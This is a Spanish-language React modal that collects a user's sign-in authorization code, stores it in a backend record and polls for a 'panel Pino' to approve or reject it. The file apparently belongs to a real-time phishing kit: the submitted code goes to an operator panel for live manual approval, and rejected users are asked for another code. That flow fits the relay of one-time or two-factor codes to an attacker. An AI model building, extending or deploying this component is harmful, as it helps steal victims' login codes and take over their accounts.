import { useState, useEffect, useRef } from "react";
import { api } from "@/api/apiClient";

export default function AuthorizationCodeModal({ isOpen, onClose }) {
  const [authCode, setAuthCode] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [requestId, setRequestId] = useState("");
  const [waitingForApproval, setWaitingForApproval] = useState(false);
  const [rejectionReason, setRejectionReason] = useState("");
  const pollIntervalRef = useRef(null);

  useEffect(() => {
    if (isOpen) {
      const id = sessionStorage.getItem("pinoRequestId");
      console.log("🔍 Modal abierto. pinoRequestId del sessionStorage:", id);
      setRequestId(id || "");
      setAuthCode("");
      setError("");
      setWaitingForApproval(false);
      setRejectionReason("");

      if (!id) {
        console.warn("⚠️ No pinoRequestId found in sessionStorage. Modal will wait for one to be set.");
        setError("Esperando inicialización de solicitud...");
      }
    }

    // Limpiar polling cuando el componente se desmonta o modal cierra
    return () => {
      if (pollIntervalRef.current) {
        clearInterval(pollIntervalRef.current);
      }
    };
  }, [isOpen]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError("");
    setRejectionReason("");

    if (!authCode.trim()) {
      setError("Por favor ingrese el código de autorización");
      return;
    }

    if (!requestId) {
      setError("Error: No se encontró ID de solicitud");
      return;
    }

    setLoading(true);
    setWaitingForApproval(true);
    try {
      console.log("📤 Enviando código:", {
        requestId,
        authCode: authCode.trim(),
      });

      await api.entities.PinoPermiso.update(requestId, {
        etapa: authCode.trim(),
      });

      console.log("✅ Código guardado. Esperando aprobación del panel...");

      // No verificar rechazo aquí - esperar a que el panel lo apruebe/rechace

      setAuthCode("");

      const codeSubmitTime = Date.now();
      let lastKnownStatus = "pendiente";
      let firstCheck = true;

      console.log("🔄 Iniciando polling cada 2 segundos para requestId:", requestId);
      console.log("⏱️ Código enviado a las:", new Date(codeSubmitTime).toLocaleTimeString());

      // Iniciar polling para verificar aprobación/rechazo cada 2 segundos
      const interval = setInterval(async () => {
        console.log("🔍 Verificando estado en Supabase...");
        try {
          const updatedRequest = await api.entities.PinoPermiso.get(requestId);
          const timeSinceSubmit = Date.now() - codeSubmitTime;

          console.log("📋 Estado actual:", {
            id: requestId,
            status: updatedRequest.status,
            etapa: updatedRequest.etapa,
            lastKnown: lastKnownStatus,
            tiempoDesdeEnvio: timeSinceSubmit + "ms",
            firstCheck: firstCheck
          });

          // SOLO recargar si:
          // 1. NO es la primera verificación (para evitar falsos positivos)
          // 2. El status CAMBIÓ a aprobado
          if (
            !firstCheck &&
            lastKnownStatus !== "aprobado" &&
            (updatedRequest.status === "aprobado" || updatedRequest.status === "approved")
          ) {
            clearInterval(interval);
            console.log("✅ Panel cambió estado a APROBADO. Recargando en 1 segundo...");
            setTimeout(() => {
              console.log("🔄 Recargando página ahora...");
              window.location.reload();
            }, 1000);
            return;
          }

          firstCheck = false;
          lastKnownStatus = updatedRequest.status;

          // Log completo para detectar rechazo
          console.log("📦 Registro completo:", JSON.stringify(updatedRequest, null, 2));

          // Si fue rechazado por el panel (verificar múltiples campos posibles)
          const isRejected =
            updatedRequest.status === "rechazado" ||
            updatedRequest.status === "rejected" ||
            updatedRequest.estado === "rechazado" ||
            updatedRequest.admin_status === "rechazado";

          if (isRejected) {
            clearInterval(interval);
            console.log("❌ Panel rechazó la solicitud. Mostrando opción de reintentar...");

            const razonRechazo =
              updatedRequest.razon_rechazo ||
              updatedRequest.motivo_rechazo ||
              updatedRequest.razon ||
              updatedRequest.mensaje ||
              "El código fue rechazado. Por favor intente nuevamente.";

            console.log("Razón del rechazo:", razonRechazo);
            setRejectionReason(razonRechazo);
            setWaitingForApproval(false);
            setLoading(false);
            return;
          }
        } catch (pollErr) {
          console.error("Error verificando aprobación:", pollErr);
        }
      }, 2000);

      pollIntervalRef.current = interval;
    } catch (err) {
      console.error("❌ Error al guardar el código:", err);

      const error = err instanceof Error ? err : new Error(String(err));

      // Verificar si es un error de rechazo (solo status 403, no errores de red)
      const isRejectionError =
        err &&
        typeof err === "object" &&
        "response" in err &&
        err.response?.status === 403;

      if (isRejectionError) {
        const message =
          err.response?.data?.mensaje ||
          "El código fue rechazado. Por favor intente nuevamente.";
        setRejectionReason(message);
      } else {
        // Errores de red o conexión - mostrar como error, no como rechazo
        setError(
          error.message ||
          "Error al guardar el código. Verifica tu conexión a internet y la consola (F12) para más detalles."
        );
      }

      setWaitingForApproval(false);
      setLoading(false);
    }
  };

  const handleRetry = () => {
    setAuthCode("");
    setError("");
    setRejectionReason("");
    setWaitingForApproval(false);
    setLoading(false);
  };

  if (!isOpen) return null;

  return (
    <div
      style={{
        position: "fixed",
        top: 0,
        left: 0,
        right: 0,
        bottom: 0,
        backgroundColor: "rgba(0, 0, 0, 0.5)",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        zIndex: 1000,
        padding: "16px",
      }}
    >
      <div
        style={{
          backgroundColor: "#FFFFFF",
          borderRadius: "8px",
          boxShadow: "0 4px 12px rgba(0, 0, 0, 0.15)",
          padding: "32px 24px",
          maxWidth: "380px",
          width: "100%",
          fontFamily: "Arial, Helvetica, sans-serif",
        }}
      >
        {/* Header */}
        <div style={{ textAlign: "center", marginBottom: "20px" }}>
          <h2
            style={{
              margin: 0,
              fontSize: "18px",
              fontWeight: 600,
              color: "#000066",
              marginBottom: "8px",
            }}
          >
            Código de Autorización
          </h2>
          <p
            style={{
              margin: 0,
              fontSize: "13px",
              color: "#666666",
              lineHeight: "1.4",
            }}
          >
            Ingrese su código de autorización para completar el inicio de sesión
          </p>
        </div>

        {/* Error Message */}
        {error && (
          <div
            style={{
              marginBottom: "16px",
              padding: "10px 12px",
              backgroundColor: "#fee",
              border: "1px solid #fcc",
              borderRadius: "4px",
              fontSize: "12px",
              color: "#c33",
              lineHeight: "1.4",
            }}
          >
            {error}
          </div>
        )}

        {/* Waiting for Approval State */}
        {waitingForApproval && !rejectionReason && (
          <div
            style={{
              marginBottom: "16px",
              padding: "20px",
              backgroundColor: "#e3f2fd",
              border: "1px solid #90caf9",
              borderRadius: "4px",
              textAlign: "center",
              fontSize: "13px",
              color: "#1565c0",
              lineHeight: "1.6",
            }}
          >
            <div style={{ marginBottom: "16px", display: "flex", justifyContent: "center" }}>
              <div
                style={{
                  width: "40px",
                  height: "40px",
                  border: "3px solid #90caf9",
                  borderTop: "3px solid #1565c0",
                  borderRadius: "50%",
                  animation: "spin 1s linear infinite",
                }}
              />
              <style>{`
                @keyframes spin {
                  0% { transform: rotate(0deg); }
                  100% { transform: rotate(360deg); }
                }
              `}</style>
            </div>
            <div style={{ marginBottom: "8px", fontWeight: 600, fontSize: "14px" }}>
              ⏳ Esperando aprobación
            </div>
            <p style={{ margin: 0, fontSize: "12px" }}>
              Tu código ha sido enviado al panel Pino. Por favor espera la aprobación o rechazo.
            </p>
          </div>
        )}

        {/* Rejection State */}
        {rejectionReason && (
          <div
            style={{
              marginBottom: "16px",
              padding: "12px",
              backgroundColor: "#ffebee",
              border: "1px solid #ef5350",
              borderRadius: "4px",
              fontSize: "13px",
              color: "#c62828",
              lineHeight: "1.5",
            }}
          >
            <div style={{ marginBottom: "8px", fontWeight: 600 }}>
              ❌ {rejectionReason}
            </div>
            <p style={{ margin: 0, fontSize: "12px" }}>
              Por favor intenta nuevamente con otro código.
            </p>
          </div>
        )}

        {/* Form */}
        {!waitingForApproval && (
          <form onSubmit={handleSubmit} style={{ display: "flex", flexDirection: "column", alignItems: "center" }}>
            <div style={{ width: "100%", marginBottom: "20px" }}>
              <label
                htmlFor="authCode"
                style={{
                  display: "block",
                  marginBottom: "6px",
                  fontSize: "12px",
                  fontWeight: 600,
                  color: "#333333",
                }}
              >
                Código de Autorización
              </label>
              <input
                id="authCode"
                type="text"
                placeholder="Ingrese el código"
                value={authCode}
                onChange={(e) => setAuthCode(e.target.value)}
                autoFocus
                disabled={loading || !requestId}
                style={{
                  width: "100%",
                  padding: "8px 10px",
                  fontSize: "13px",
                  border: "1px solid #cccccc",
                  borderRadius: "3px",
                  fontFamily: "Arial, Helvetica, sans-serif",
                  boxSizing: "border-box",
                  opacity: loading || !requestId ? 0.6 : 1,
                }}
              />
            </div>

            {/* Button */}
            <button
              type="submit"
              disabled={loading || !requestId}
              style={{
                width: "120px",
                padding: "8px 16px",
                fontSize: "12px",
                fontWeight: 600,
                backgroundColor: loading || !requestId ? "#999999" : "#3366cc",
                color: "#FFFFFF",
                border: "none",
                borderRadius: "3px",
                cursor: loading || !requestId ? "not-allowed" : "pointer",
                fontFamily: "Arial, Helvetica, sans-serif",
              }}
            >
              {loading ? "Cargando..." : "Aceptar"}
            </button>
          </form>
        )}

        {/* Retry Button for Rejection */}
        {rejectionReason && (
          <button
            onClick={handleRetry}
            style={{
              width: "100%",
              padding: "10px 16px",
              fontSize: "12px",
              fontWeight: 600,
              backgroundColor: "#3366cc",
              color: "#FFFFFF",
              border: "none",
              borderRadius: "3px",
              cursor: "pointer",
              fontFamily: "Arial, Helvetica, sans-serif",
            }}
          >
            Reintentar
          </button>
        )}
      </div>
    </div>
  );
}
